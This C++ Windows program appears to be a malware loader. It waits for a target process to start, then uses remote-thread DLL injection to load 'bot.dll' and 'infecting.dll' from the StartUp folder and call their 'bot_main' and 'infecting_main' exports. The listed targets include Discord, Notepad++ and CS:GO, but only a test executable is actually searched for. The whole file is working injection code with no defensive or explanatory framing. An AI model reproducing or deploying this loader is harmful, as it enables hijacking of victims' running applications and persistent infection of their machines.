#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <wchar.h>

#define APPLICATIONS 4
typedef UINT* IntPtr, UIntPtr;

DWORD GetProcId(const WCHAR* proc_name, size_t len)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!memcmp(procEntry.szExeFile, proc_name, len))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

void InjectDLL(HANDLE hProcess, LPCSTR strDLLName, LPCSTR func)
{
    HMODULE hLoader = LoadLibraryA(strDLLName);
    FARPROC hLoaderProc = GetProcAddress(hLoader, func);
    UINT offset = (UINT)hLoaderProc - (UINT)hLoader;
    FreeLibrary(hLoader);
    UINT nLenWrite = strlen(strDLLName) + 1;

    void* loc = VirtualAllocEx(hProcess, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, loc, strDLLName, nLenWrite, 0);
    HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
    WaitForSingleObject(hThread, 5000);
    DWORD exitcode;
    GetExitCodeThread(hThread, &exitcode);
    CloseHandle(hThread);

    void* loc2 = VirtualAllocEx(hProcess, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HANDLE hThread2 = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)(exitcode + offset), NULL, 0, 0);
}

int main()
{
    LPCSTR dll_bot = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\bot.dll";
    LPCSTR dll_infecting = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\infecting.dll";

    const WCHAR* proc_name[] = {
        L"TESTTEST.exe",
        L"Discord.exe",
        L"notepad++.exe",
        L"csgo.exe"
    };
    DWORD procId = 0;

    while (!procId)
    {
        for (int i = 0; i < APPLICATIONS; i++)
        {
            procId = GetProcId(L"TESTTEST.exe", sizeof(L"TESTTEST.exe"));
            if (procId)
                break;
        }
        Sleep(1000);
    }
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

    InjectDLL(hProc, dll_bot, "bot_main");
    InjectDLL(hProc, dll_infecting, "infecting_main");
    return 0;
}